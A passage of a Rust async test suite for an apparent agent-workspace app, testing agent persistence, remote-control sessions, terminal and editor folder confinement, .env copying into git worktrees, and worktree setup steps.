    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.turn(&id, "Bonjour").await;
    h.core.flush_conv();
    let ops: Vec<Value> = h
        .events
        .lock()
        .iter()
        .filter(|e| e["type"] == "conv" && e["agentId"] == id.as_str())
        .flat_map(|e| e["ops"].as_array().unwrap().clone())
        .collect();
    let text_id = ops
        .iter()
        .find(|o| o["op"] == "append" && o["item"]["kind"] == "text")
        .unwrap()["item"]["id"]
        .clone();
    let for_text: Vec<&Value> = ops
        .iter()
        .filter(|o| o["id"] == text_id || o["item"]["id"] == text_id)
        .collect();
    let kinds: Vec<&str> = for_text.iter().map(|o| o["op"].as_str().unwrap()).collect();
    assert_eq!(
        kinds,
        vec!["append", "delta", "patch"],
        "the fake streams several chunks, merged into one delta"
    );
    assert_eq!(for_text[1]["text"], "Bonjour, tu as dit : Bonjour");
}

#[tokio::test]
async fn agents_created_at_the_same_time_get_distinct_names() {
    let h = harness("names");
    let (p, _) = h.project(true).await;
    let (a, b) = tokio::join!(
        h.core.create_agent(&p.id, None),
        h.core.create_agent(&p.id, None)
    );
    let (a, b) = (a.unwrap(), b.unwrap());
    assert_ne!(a.meta.name, b.meta.name);
    assert_ne!(a.meta.worktree.unwrap().path, b.meta.worktree.unwrap().path);
}

#[tokio::test]
async fn state_is_saved_and_reloaded_with_the_session() {
    let h = harness("persist");
    let (p, _) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.turn(&id, "Bonjour").await;
    h.core.save_now();
    let app = mock_app();
    let (reloaded, _rx) = Core::load(app.handle().clone(), h.core.data.clone());
    let meta = reloaded.agent(&id).unwrap().lock().meta.clone();
    assert_eq!(meta.session_id, h.agent(&id).session_id);
    assert_eq!(meta.status, AgentStatus::Done);
    assert_eq!(
        reloaded.agent(&id).unwrap().lock().conv.items().len(),
        h.items(&id).len()
    );
}

#[tokio::test]
async fn tickets_are_saved_with_the_app_and_projects_keep_their_board() {
    let h = harness("tk-persist");
    let (p, _) = h.project(false).await;
    h.core.tickets.write().push(Ticket {
        id: "t1".into(),
        project_id: p.id.clone(),
        key: "DEM-1".into(),
        title: "Un ticket".into(),
        ..Default::default()
    });
    let copy = vec![".env*".to_string(), "**/.env.local".to_string()];
    h.core
        .update_project(Project {
            worktree_copy: copy.clone(),
            ..p.clone()
        })
        .unwrap();
    h.core.save_now();
    let app = mock_app();
    let (reloaded, _rx) = Core::load(app.handle().clone(), h.core.data.clone());
    assert_eq!(reloaded.tickets.read()[0].key, "DEM-1");
    let project = reloaded.project(&p.id).unwrap();
    assert_eq!(project.worktree_copy, copy);
    assert_eq!(project.board.max_parallel, 2);
}

#[tokio::test]
async fn the_models_claude_code_runs_reach_the_ui_and_are_kept_for_the_next_launch() {
    let h = harness("models-catalog");
    let (p, _) = h.project(false).await;
    h.core.create_agent(&p.id, None).await.unwrap();
    h.wait("the models", |h| {
        h.events.lock().iter().any(|e| e["type"] == "models")
    })
    .await;
    let event = h
        .events
        .lock()
        .iter()
        .find(|e| e["type"] == "models")
        .cloned()
        .unwrap();
    assert_eq!(
        event["models"][1],
        json!({ "value": "sonnet", "resolvedModel": "claude-sonnet-5-5" })
    );
    h.core.save_now();
    let app = mock_app();
    let (reloaded, _rx) = Core::load(app.handle().clone(), h.core.data.clone());
    let models = reloaded.models.read().clone();
    assert_eq!(models.len(), 3);
    assert_eq!(models[1].value, "sonnet");
    assert_eq!(models[1].resolved_model, "claude-sonnet-5-5");
}

#[tokio::test]
async fn the_same_models_reported_again_do_not_notify_the_ui_again() {
    let h = harness("models-again");
    let (p, _) = h.project(false).await;
    for _ in 0..2 {
        let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
        h.core.ensure_process(&id).await.unwrap();
    }
    let reports = |h: &Harness| {
        h.events
            .lock()
            .iter()
            .filter(|e| e["type"] == "models")
            .count()
    };
    h.wait("the models", |h| reports(h) > 0).await;
    tokio::time::sleep(Duration::from_millis(200)).await;
    assert_eq!(reports(&h), 1);
}

#[tokio::test]
async fn remote_control_links_the_agent_to_claude_ai() {
    let h = harness("remote-on");
    let (p, r) = h.project(false).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let id = a.meta.id.clone();
    h.core.set_remote_control(&id, true).await.unwrap();
    let m = h.agent(&id);
    assert!(m.remote_control);
    let session = m.remote_session.clone().expect("remote session kept");
    assert_eq!(
        m.remote_url.as_deref(),
        Some(format!("https://claude.ai/code/session_{}", &session[4..]).as_str())
    );
    let req = h.remote_requests(&r).pop().unwrap();
    assert_eq!(req["enabled"], true);
    assert_eq!(req["keep_session_on_exit"], true);
    assert_eq!(req["name"], format!("demo · {}", m.name));
    h.wait("link connected", |h| {
        h.core
            .agent(&id)
            .unwrap()
            .lock()
            .view()
            .remote_state
            .as_deref()
            == Some("connected")
    })
    .await;
    // Messages sent from claude.ai are re-emitted to the app.
    assert!(h
        .launches(&r)
        .last()
        .unwrap()
        .contains(&"--replay-user-messages".to_string()));
}

#[tokio::test]
async fn a_remote_agent_gets_its_remote_session_back_after_a_restart() {
    let h = harness("remote-reattach");
    let (p, r) = h.project(false).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let id = a.meta.id.clone();
    h.core.set_remote_control(&id, true).await.unwrap();
    let session = h.agent(&id).remote_session.unwrap();
    let old = h.core.agent(&id).unwrap().lock().detach().unwrap();
    old.close_input();
    h.core.ensure_process(&id).await.unwrap();
    let req = h.remote_requests(&r).pop().unwrap();
    assert_eq!(req["reattach_session_id"], session.as_str());
    assert_eq!(
        h.agent(&id).remote_session.as_deref(),
        Some(session.as_str())
    );
}

#[tokio::test]
async fn remote_agents_stay_reachable_instead_of_being_idle_stopped() {
    let h = harness("remote-idle");
    let (p, _) = h.project(false).await;
    let remote = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    let local = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.core.set_remote_control(&remote, true).await.unwrap();
    h.core.ensure_process(&local).await.unwrap();
    for id in [&remote, &local] {
        h.core.agent(id).unwrap().lock().meta.last_activity = 0;
    }
    h.core.stop_idle_processes();
    assert!(h.alive(&remote));
    assert!(!h.alive(&local));
}

#[tokio::test]
async fn turning_remote_control_off_ends_the_remote_session() {
    let h = harness("remote-off");
    let (p, r) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.core.set_remote_control(&id, true).await.unwrap();
    h.core.set_remote_control(&id, false).await.unwrap();
    let m = h.agent(&id);
    assert!(!m.remote_control);
    assert_eq!((m.remote_session, m.remote_url), (None, None));
    assert_eq!(h.remote_requests(&r).pop().unwrap()["enabled"], false);
}

#[tokio::test]
async fn remote_agents_are_started_with_the_app() {
    let h = harness("remote-startup");
    let (p, _) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    // Creating an agent warms its process up: let it start, then stop it, so that only
    // start_remote_agents can start (and link) the next one.
    h.core.ensure_process(&id).await.unwrap();
    // The warm-up task only runs when the test yields (single-threaded runtime): let it finish.
    tokio::time::sleep(Duration::from_millis(300)).await;
    h.core
        .agent(&id)
        .unwrap()
        .lock()
        .detach()
        .unwrap()
        .close_input();
    h.core.agent(&id).unwrap().lock().meta.remote_control = true;
    assert!(!h.alive(&id));
    h.core.start_remote_agents();
    h.wait("remote agent started", |h| {
        h.agent(&id).remote_url.is_some()
    })
    .await;
}

#[tokio::test]
async fn a_deleted_agent_is_never_sent_back_to_the_ui() {
    let h = harness("delete-late");
    let (p, _) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.turn(&id, "Bonjour").await;
    h.core.delete_agent(&id, false).await.unwrap();
    // The killed process exits afterwards: that must not bring the agent back.
    tokio::time::sleep(Duration::from_millis(1500)).await;
    let events = h.events.lock();
    let removed = events
        .iter()
        .position(|e| e["type"] == "agentRemoved" && e["id"] == id.as_str())
        .expect("removal sent");
    let late: Vec<&Value> = events[removed..]
        .iter()
        .filter(|e| e["type"] == "agent" && e["agent"]["id"] == id.as_str())
        .collect();
    assert!(
        late.is_empty(),
        "agent sent again after its removal: {late:?}"
    );
}

#[tokio::test]
async fn launch_commands_are_saved_with_the_project() {
    let h = harness("run-config");
    let (p, _) = h.project(false).await;
    let cmd = RunCommand {
        id: "c1".into(),
        name: "Front".into(),
        command: "npm run dev".into(),
        shell: "pwsh".into(),
        cwd: "web".into(),
    };
    h.core
        .update_project(Project {
            run_commands: vec![cmd.clone()],
            ..p.clone()
        })
        .unwrap();
    assert_eq!(h.core.project(&p.id).unwrap().run_commands, vec![cmd]);
    h.core.save_now();
    let saved = std::fs::read_to_string(h.dir.join("data").join("state.json")).unwrap();
    assert!(saved.contains("npm run dev"), "{saved}");
}

#[tokio::test]
async fn the_editor_reads_and_writes_the_checkout_of_its_source() {
    let h = harness("core-edit-root");
    let (p, r) = h.project(true).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let wt = PathBuf::from(a.meta.worktree.clone().unwrap().path);
    std::fs::write(wt.join("src").join("app.ts"), "const a = 3;\n").unwrap();

    let (root, base) = h
        .core
        .edit_root(&p.id, Some(a.meta.id.clone()))
        .await
        .unwrap();
    assert_eq!(
        Path::new(&root).canonicalize().unwrap(),
        wt.canonicalize().unwrap()
    );
    assert_eq!(base.as_deref(), Some("main"));
    let t = crate::fsedit::read(Path::new(&root), "src/app.ts").unwrap();
    assert_eq!(t.text.as_deref(), Some("const a = 3;\n"));

    let (root, base) = h.core.edit_root(&p.id, None).await.unwrap();
    assert_eq!(
        Path::new(&root).canonicalize().unwrap(),
        r.canonicalize().unwrap()
    );
    assert_eq!(base, None);
    let t = crate::fsedit::read(Path::new(&root), "src/app.ts").unwrap();
    assert_eq!(t.text.as_deref(), Some("const a = 1;\n"));
}

/// The folder `term_cwd` gave, as the disk spells it (Windows adds `\\?\` to a canonical path).
fn same_dir(cwd: &str, expected: &Path) -> bool {
    Path::new(cwd).canonicalize().unwrap() == expected.canonicalize().unwrap()
}

#[tokio::test]
async fn a_terminal_opens_in_the_worktree_of_an_agent_or_the_project_and_in_a_folder_of_it() {
    let h = harness("core-term-cwd-worktree");
    let (p, r) = h.project(true).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let wt = PathBuf::from(a.meta.worktree.clone().unwrap().path);
    let id = Some(a.meta.id.clone());

    // No agent: the project's folder, as every terminal opened before this did.
    assert_eq!(
        h.core.term_cwd(&p.id, None, None).await.unwrap(),
        p.path.as_str()
    );
    // An agent with a worktree: its worktree, not the project's checkout.
    let cwd = h.core.term_cwd(&p.id, id.clone(), None).await.unwrap();
    assert!(same_dir(&cwd, &wt), "{cwd}");
    // A folder of the source: in the worktree for the agent, in the project otherwise.
    let cwd = h
        .core
        .term_cwd(&p.id, id.clone(), Some("src"))
        .await
        .unwrap();
    assert!(same_dir(&cwd, &wt.join("src")), "{cwd}");
    let cwd = h.core.term_cwd(&p.id, None, Some("src")).await.unwrap();
    assert!(same_dir(&cwd, &r.join("src")), "{cwd}");
    // The tree's `/` does not end up mixed with a Windows path's `\`.
    std::fs::create_dir_all(wt.join("src").join("deep")).unwrap();
    let cwd = h
        .core
        .term_cwd(&p.id, id.clone(), Some("src/deep"))
        .await
        .unwrap();
    assert_eq!(cwd, wt.join("src").join("deep").to_string_lossy());
    // An empty folder is no folder.
    let cwd = h.core.term_cwd(&p.id, id, Some("  ")).await.unwrap();
    assert!(same_dir(&cwd, &wt), "{cwd}");
}

#[tokio::test]
async fn a_terminal_for_an_agent_without_a_worktree_opens_in_the_project() {
    let h = harness("core-term-cwd-no-worktree");
    let (p, r) = h.project(false).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    assert!(a.meta.worktree.is_none());
    let id = Some(a.meta.id.clone());

    assert_eq!(
        h.core.term_cwd(&p.id, id.clone(), None).await.unwrap(),
        p.path.as_str()
    );
    let cwd = h.core.term_cwd(&p.id, id, Some("src")).await.unwrap();
    assert!(same_dir(&cwd, &r.join("src")), "{cwd}");
}

#[tokio::test]
async fn a_terminal_stays_in_the_source_it_is_asked_for() {
    let h = harness("core-term-cwd-confined");
    let (p, r) = h.project(true).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let id = Some(a.meta.id.clone());
    let outside = r.parent().unwrap().to_string_lossy().to_string();

    for source in [None, id.clone()] {
        for sub in ["..", "../..", "src/../..", outside.as_str()] {
            let err = h
                .core
                .term_cwd(&p.id, source.clone(), Some(sub))
                .await
                .unwrap_err()
                .to_string();
            assert!(err.contains("hors du dossier"), "{sub}: {err}");
        }
        // A folder that is not one, or not there.
        for sub in ["src/app.ts", "nope"] {
            let err = h
                .core
                .term_cwd(&p.id, source.clone(), Some(sub))
                .await
                .unwrap_err()
                .to_string();
            assert!(err.contains(sub), "{sub}: {err}");
        }
    }
    // An agent the app does not know opens nothing in the project instead.
    assert!(h
        .core
        .term_cwd(&p.id, Some("ghost".into()), None)
        .await
        .is_err());
}

#[tokio::test]
async fn a_terminal_is_refused_for_an_agent_whose_worktree_vanished() {
    let h = harness("core-term-cwd-gone");
    let (p, _) = h.project(true).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let wt = a.meta.worktree.clone().unwrap();
    h.wait("warm-up", |h| h.alive(&a.meta.id)).await;
    if let Some(proc) = h.core.agent(&a.meta.id).unwrap().lock().detach() {
        proc.kill();
    }
    tokio::time::sleep(Duration::from_millis(300)).await;
    std::fs::remove_dir_all(&wt.path).unwrap();

    // Not a shell opened elsewhere, in the app's own folder, as if it were the worktree.
    for sub in [None, Some("src")] {
        let err = h
            .core
            .term_cwd(&p.id, Some(a.meta.id.clone()), sub)
            .await
            .unwrap_err()
            .to_string();
        assert!(err.contains("worktree"), "{sub:?}: {err}");
    }
}

#[tokio::test]
async fn the_editor_says_so_when_the_worktree_of_its_agent_vanished() {
    let h = harness("core-edit-root-gone");
    let (p, _) = h.project(true).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let wt = a.meta.worktree.clone().unwrap();
    h.wait("warm-up", |h| h.alive(&a.meta.id)).await;
    if let Some(proc) = h.core.agent(&a.meta.id).unwrap().lock().detach() {
        proc.kill();
    }
    tokio::time::sleep(Duration::from_millis(300)).await;
    std::fs::remove_dir_all(&wt.path).unwrap();

    // The tree, the search, a file read or written, a rename: the same words, not the system's.
    let id = Some(a.meta.id.clone());
    let gone = "Le worktree de l'agent n'existe plus";
    let e = h.core.edit_root(&p.id, id.clone()).await.unwrap_err();
    assert_eq!(e.to_string(), gone);
    let e = h.core.fs_tree(&p.id, id.clone()).await.unwrap_err();
    assert_eq!(e.to_string(), gone);
    let e = h.core.edit_kept(&p.id, id).await.unwrap_err();
    assert_eq!(e.to_string(), gone);
    // Nothing made again where the worktree was.
    assert!(!Path::new(&wt.path).exists());
    // The project's own files are still there to edit.
    assert!(h.core.edit_root(&p.id, None).await.is_ok());
}

#[tokio::test]
async fn the_editor_and_terminals_take_no_agent_of_another_project() {
    let h = harness("core-edit-root-foreign");
    let (p, _) = h.project(true).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let other_dir = h.dir.join("other");
    std::fs::create_dir_all(&other_dir).unwrap();
    let other = h
        .core
        .create_project(
            &other_dir.to_string_lossy(),
            "other",
            "oklch(0.72 0.12 48)",
            false,
            None,
        )
        .await
        .unwrap();
    let id = Some(a.meta.id.clone());

    // Its worktree is not the other project's folder to edit, nor to open a shell in.
    let refused = "agent introuvable dans ce projet";
    let e = h.core.edit_root(&other.id, id.clone()).await.unwrap_err();
    assert_eq!(e.to_string(), refused);
    let e = h.core.edit_kept(&other.id, id.clone()).await.unwrap_err();
    assert_eq!(e.to_string(), refused);
    let e = h
        .core
        .term_cwd(&other.id, id.clone(), None)
        .await
        .unwrap_err();
    assert_eq!(e.to_string(), refused);
    // In its own project, its worktree.
    let (root, base) = h.core.edit_root(&p.id, id).await.unwrap();
    assert!(same_dir(&root, Path::new(&a.meta.worktree.unwrap().path)));
    assert_eq!(base.as_deref(), Some("main"));
}

#[tokio::test]
async fn the_editor_tree_shows_the_files_the_project_copies_into_its_worktrees() {
    let h = harness("core-edit-tree-copied");
    let (p, r) = h.project(true).await;
    ignore(&r, ".env*");
    ignore(&r, "node_modules/");
    std::fs::write(r.join(".env"), "SECRET=1\n").unwrap();
    std::fs::create_dir_all(r.join("node_modules")).unwrap();
    std::fs::write(r.join("node_modules").join("x.js"), "x\n").unwrap();
    let a = h.core.create_agent(&p.id, None).await.unwrap();

    // The project's checkout and the agent's worktree, where the copy put it: the copied file is
    // listed and marked ignored, the dependencies are not there.
    for source in [None, Some(a.meta.id.clone())] {
        let t = h.core.fs_tree(&p.id, source.clone()).await.unwrap();
        assert_eq!(t.ignored, [".env"], "{source:?}");
        assert!(t.files.contains(&".env".to_string()), "{source:?}");
        assert!(!t.files.iter().any(|f| f.starts_with("node_modules")));
    }

    // The patterns are the project's own: none, nothing more than git lists.
    h.core
        .update_project(Project {
            worktree_copy: Vec::new(),
            ..p.clone()
        })
        .unwrap();
    let t = h.core.fs_tree(&p.id, None).await.unwrap();
    assert!(t.ignored.is_empty() && !t.files.contains(&".env".to_string()));
}

#[tokio::test]
async fn the_editor_tree_of_a_project_in_a_subfolder_shows_the_files_copied_from_that_folder() {
    let h = harness("core-edit-tree-copied-below");
    let (_, r) = h.project(false).await;
    ignore(&r, ".env*");
    let sub = r.join("packages").join("web");
    std::fs::create_dir_all(&sub).unwrap();
    std::fs::write(
        sub.join("index.ts"),
        "x
",
    )
    .unwrap();
    git(&r, &["add", "-A"]);
    git(&r, &["commit", "-qm", "web"]);
    std::fs::write(
        sub.join(".env"),
        "SECRET=1
",
    )
    .unwrap();
    let p = h
        .core
        .create_project(
            &sub.to_string_lossy(),
            "web",
            "oklch(0.72 0.12 48)",
            true,
            None,
        )
        .await
        .unwrap();
    let t = h.core.fs_tree(&p.id, None).await.unwrap();
    assert_eq!(t.ignored, ["packages/web/.env"]);
    assert!(t.files.contains(&"packages/web/index.ts".to_string()));

    // The agent's worktree is the checkout's root: the copy put `.env` where it is in the repository.
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let t = h.core.fs_tree(&p.id, Some(a.meta.id)).await.unwrap();
    assert!(t.ignored.iter().all(|f| t.files.contains(f)));
}

#[tokio::test]
async fn the_editor_keeps_the_folders_and_worktrees_of_every_project_of_the_repository() {
    let h = harness("core-edit-kept");
    let (whole, r) = h.project(true).await;
    // Two more projects in folders of the same repository, each with an agent in a worktree.
    let mut subs = Vec::new();
    for name in ["api", "web"] {
        let dir = r.join("packages").join(name);
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(dir.join("index.ts"), "x\n").unwrap();
        git(&r, &["add", "-A"]);
        git(&r, &["commit", "-qm", name]);
        let p = h
            .core
            .create_project(
                &dir.to_string_lossy(),
                name,
                "oklch(0.72 0.12 48)",
                true,
                None,
            )
            .await
            .unwrap();
        h.core.create_agent(&p.id, None).await.unwrap();
        subs.push(p);
    }
    let sent = std::cell::RefCell::new(Vec::new());
    let send = |p: &Path| {
        sent.borrow_mut().push(p.to_path_buf());
        Ok(())
    };
    // From `web`, whose source is the repository: the other project and its agents' checkouts too.
    let (root, kept) = h.core.edit_kept(&subs[1].id, None).await.unwrap();
    let root = Path::new(&root);
    for rel in [
        "packages/api",
        "packages/api/.claude",
        "packages",
        "packages/web",
    ] {
        let err = crate::fsedit::delete(root, rel, &kept, send)
            .unwrap_err()
            .to_string();
        assert!(
            err.contains("projet") || err.contains("worktree"),
            "{rel}: {err}"
        );
        assert!(
            crate::fsedit::rename(root, rel, "moved", &kept).is_err(),
            "{rel}"
        );
    }
    // From the project at the root of the repository: the same.
    let (_, kept) = h.core.edit_kept(&whole.id, None).await.unwrap();
    for rel in ["packages/web", "packages/api/.claude"] {
        assert!(
            crate::fsedit::delete(root, rel, &kept, send).is_err(),
            "{rel}"
        );
    }
    assert!(sent.borrow().is_empty());
    // Their files are files like any other.
    crate::fsedit::delete(root, "packages/api/index.ts", &kept, send).unwrap();
    assert_eq!(sent.borrow().len(), 1);
}

#[tokio::test]
async fn quitting_with_unsaved_files_asks_the_window_first() {
    use std::sync::atomic::Ordering;
    let h = harness("core-quit-unsaved");
    assert!(!h.core.ask_before_quit());
    h.core.unsaved.store(2, Ordering::Release);
    assert!(h.core.ask_before_quit());
    assert!(h
        .events
        .lock()
        .iter()
        .any(|e| e["type"] == "quitRequested" && e["unsaved"] == 2));
}

#[tokio::test]
async fn a_reloaded_window_holds_no_unsaved_file_any_more() {
    use std::sync::atomic::Ordering;
    let h = harness("core-unsaved-reload");
    h.core.unsaved.store(2, Ordering::Release);
    h.core.reset_unsaved();
    assert!(!h.core.ask_before_quit());
}

#[tokio::test]
async fn an_agent_made_for_a_ticket_has_its_branch_from_a_base_and_the_projects_env_files() {
    let h = harness("tk-agent-options");
    let (p, r) = h.project(false).await;
    git(&r, &["checkout", "-qb", "release"]);
    commit_change(&r, "const a = 9;\n", "release");
    git(&r, &["checkout", "-q", "main"]);
    ignore(&r, ".env*");
    std::fs::write(r.join(".env"), "SECRET=1\n").unwrap();
    std::fs::write(r.join(".env.local"), "X=2\n").unwrap();
    std::fs::write(r.join("notes.txt"), "n\n").unwrap();
    let options = || AgentOptions {
        name: Some("dem-1-ajouter".into()),
        worktree: Some(("ticket/dem-1".into(), "release".into())),
        model: Some("opus".into()),
        effort: Some("max".into()),
        mode: Some("plan".into()),
        append_prompt: Some("Protocole".into()),
        ticket_id: Some("t1".into()),
        port_base: Some(4100),
        ..Default::default()
    };
    let a = h.core.create_agent_with(&p.id, options()).await.unwrap();
    let wt = a.meta.worktree.clone().unwrap();
    assert_eq!(
        (wt.branch.as_str(), wt.base_branch.as_str()),
        ("ticket/dem-1", "release")
    );
    let dir = PathBuf::from(&wt.path);
    assert_eq!(
        std::fs::read_to_string(dir.join("src").join("app.ts")).unwrap(),
        "const a = 9;\n"
    );
    assert_eq!(
        std::fs::read_to_string(dir.join(".env")).unwrap(),
        "SECRET=1\n"
    );
    assert!(dir.join(".env.local").exists() && !dir.join("notes.txt").exists());
    assert_eq!(
        (a.meta.name.as_str(), a.meta.named),
        ("dem-1-ajouter", true)
    );
    assert_eq!(
        (
            a.meta.model.as_str(),
            a.meta.effort.as_str(),
            a.meta.mode.as_str()
        ),
        ("opus", "max", "plan")
    );
    assert_eq!(
        (
            a.meta.ticket_id.as_deref(),
            a.meta.port_base,
            a.meta.append_prompt.as_deref()
        ),
        (Some("t1"), Some(4100), Some("Protocole"))
    );
    // Made by the board, not by the user: the sidebar keeps its selection.
    assert_ne!(h.core.ui.read().selected_agent.get(&p.id), Some(&a.meta.id));
    // The same branch asked again: a suffix, for the name too.
    let b = h.core.create_agent_with(&p.id, options()).await.unwrap();
    assert_eq!(b.meta.worktree.unwrap().branch, "ticket/dem-1-2");
    assert_eq!(b.meta.name, "dem-1-ajouter-2");
    // A base that does not exist: no agent at all.
    let before = h.core.agents.read().len();
    let bad = AgentOptions {
        worktree: Some(("ticket/dem-9".into(), "nowhere".into())),
        ..options()
    };
    assert!(h.core.create_agent_with(&p.id, bad).await.is_err());
    assert_eq!(h.core.agents.read().len(), before);
    // The protocol rides along at its start.
    h.core.ensure_process(&a.meta.id).await.unwrap();
    let argv = h.launches(&dir).pop().unwrap();
    let i = argv
        .iter()
        .position(|x| x == "--append-system-prompt")
        .unwrap();
    assert_eq!(argv[i + 1], "Protocole");
}

#[tokio::test]
async fn a_worktree_agent_gets_only_the_env_files_git_ignores() {
    let h = harness("tk-agent-env");
    let (p, r) = h.project(true).await;
    ignore(&r, ".env");
    std::fs::write(r.join(".env"), "SECRET=1\n").unwrap();
    // Untracked but not ignored: copied, it would be the agent's change, offered for commit.
    std::fs::write(r.join(".env.local"), "X=2\n").unwrap();
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let wt = PathBuf::from(a.meta.worktree.unwrap().path);
    assert_eq!(
        std::fs::read_to_string(wt.join(".env")).unwrap(),
        "SECRET=1\n"
    );
    assert!(!wt.join(".env.local").exists());
    // Nothing of what was copied shows as a change of the agent.
    assert_eq!(git(&wt, &["status", "--porcelain"]), "");
}

#[tokio::test]
async fn an_agent_created_by_the_user_is_selected_and_left_for_haiku_to_name() {
    let h = harness("tk-agent-default");
    let (p, _r) = h.project(false).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    assert_eq!((a.meta.name.as_str(), a.meta.named), ("agent-1", false));
    assert_eq!(h.core.ui.read().selected_agent.get(&p.id), Some(&a.meta.id));
}

// ---------- worktree setup and teardown ----------

/// The worktree at `path` removed as the app does it, tried again while something still holds the
/// folder for a moment (Windows).
async fn remove_worktree_eventually(repo: &Path, path: &str) {
    let repo = repo.to_string_lossy();
    for _ in 0..50 {
        let removed = crate::git::worktree_remove_dir(&repo, path).await;
        if removed.is_ok() && !Path::new(path).exists() {
            return;
        }
        tokio::time::sleep(Duration::from_millis(200)).await;
    }
    panic!("{path} not removed");
}

/// A worktree step run by the system's first shell.
pub(crate) fn wt_step(command: &str, cwd: &str) -> WorktreeStep {
    WorktreeStep {
        id: uuid::Uuid::new_v4().to_string(),
        command: command.into(),
        shell: String::new(),
        cwd: cwd.into(),
    }
}

impl Harness {
    pub(crate) fn set_worktree_steps(
        &self,
        project_id: &str,
        setup: Vec<WorktreeStep>,
        teardown: Vec<WorktreeStep>,
    ) {
        self.core
            .update_project(Project {
                worktree_setup: setup,
                worktree_teardown: teardown,
                ..self.core.project(project_id).unwrap()
            })
            .unwrap();
    }

    pub(crate) fn view(&self, id: &str) -> AgentView {
        self.core.agent(id).unwrap().lock().view()
    }

    fn notices(&self, id: &str, level: &str) -> Vec<String> {
        self.items(id)
            .iter()
            .filter(|i| i["kind"] == "notice" && i["level"] == level)
            .map(|i| i["text"].as_str().unwrap().to_string())
            .collect()
    }
}

#[tokio::test]
async fn a_new_worktree_is_set_up_before_its_agent_takes_a_message() {
    let h = harness("wt-setup");
    let (p, _) = h.project(true).await;
    let first = r#"node -e "setTimeout(() => require('fs').writeFileSync('ready.txt', process.env.ESCOUADE_BRANCH), 1500)""#;
    h.set_worktree_steps(
        &p.id,
        vec![
            wt_step(first, ""),
            wt_step(
                r#"node -e "require('fs').writeFileSync('second.txt', require('fs').readFileSync('../ready.txt'))""#,
                "src",
            ),
        ],
        vec![],
    );
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let id = a.meta.id.clone();
    let wt = a.meta.worktree.clone().unwrap();
    let dir = PathBuf::from(&wt.path);
    // Made at once, its setup under way.
    assert_eq!(
        a.setup,
        Some(format!(
            "1/2 · {}",
            crate::worktrees::label(&wt_step(first, ""))
        ))
    );
    // Claude Code does not start before it is over (its hooks and MCP servers would meet a
    // worktree half set up), then starts at once.
    tokio::time::sleep(Duration::from_millis(500)).await;
    assert!(!h.alive(&id));
    h.wait("started once set up", |h| h.alive(&id)).await;
    assert!(dir.join("src").join("second.txt").exists());
    h.turn(&id, "Bonjour").await;
    // The message went once the setup was over: both steps ran, in order, each in its folder.
    assert_eq!(
        std::fs::read_to_string(dir.join("ready.txt")).unwrap(),
        wt.branch
    );
    assert_eq!(
        std::fs::read_to_string(dir.join("src").join("second.txt")).unwrap(),
        wt.branch
    );
    assert_eq!(h.view(&id).setup, None);
    let items = h.items(&id);
    let ready = items.iter().position(|i| {
        i["kind"] == "notice"
            && i["text"]
                .as_str()
                .unwrap()
                .starts_with("Worktree préparé (2 commandes")
    });
    let user = items.iter().position(|i| i["kind"] == "user");
    assert!(ready.is_some() && ready < user, "{items:?}");
    assert!(h.events.lock().iter().any(|e| e["type"] == "agent"
        && e["agent"]["id"] == id.as_str()
        && e["agent"]["setup"]
            .as_str()
            .is_some_and(|s| s.starts_with("2/2 · "))));
}

/// The lines of the agent's setup the window was sent, step by step: (step, total, lines) of each.
fn setup_events(h: &Harness, id: &str) -> Vec<(u64, u64, Vec<String>)> {
    h.events
        .lock()
        .iter()
        .filter(|e| e["type"] == "setupOutput" && e["agentId"] == id)
        .map(|e| {
            let lines = e["lines"]
                .as_array()
                .unwrap()
                .iter()
                .map(|l| l.as_str().unwrap().to_string())
                .collect();
            (
                e["step"].as_u64().unwrap(),
                e["total"].as_u64().unwrap(),
                lines,
            )
        })
        .collect()
}

#[tokio::test]
async fn the_setup_shows_the_output_of_its_step_as_it_comes_and_logs_all_of_it() {
    let h = harness("wt-setup-output");
    let (p, _) = h.project(true).await;
    // The first step writes, waits, then writes again; the second writes more than is kept.
    let first = r#"node -e "console.log('un'); setTimeout(() => console.log('deux'), 2500)""#;
    let second = r#"node -e "for (let i = 1; i <= 600; i++) console.log('ligne ' + i)""#;
    h.set_worktree_steps(&p.id, vec![wt_step(first, ""), wt_step(second, "")], vec![]);
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let id = a.meta.id.clone();
    // Under way: its first line is there before the step ends, as a window opened now gets it.
    h.wait("the first line", |h| {
        h.core
            .setup_outputs()
            .get(&id)
            .is_some_and(|o| o.lines.iter().any(|l| l == "un"))
    })
    .await;
    let now = h.core.setup_outputs()[&id].clone();
    assert_eq!((now.step, now.total), (0, 1));
    assert!(h.view(&id).setup.unwrap().starts_with("1/2 · "));
    h.wait("set up", |h| h.view(&id).setup.is_none()).await;
    // Over: nothing more is kept.
    assert!(!h.core.setup_outputs().contains_key(&id));
    // The window was sent each step's lines as they came, a step starting with none (the window
    // forgets the lines of the step before), each batch counting the lines of its step so far and
    // carrying all of them since the batch before, up to the 500 the window keeps.
    let sent = setup_events(&h, &id);
    let batches = |step: u64| -> Vec<&(u64, u64, Vec<String>)> {
        sent.iter().filter(|(s, _, _)| *s == step).collect()
    };
    for step in [0, 1] {
        let batches = batches(step);
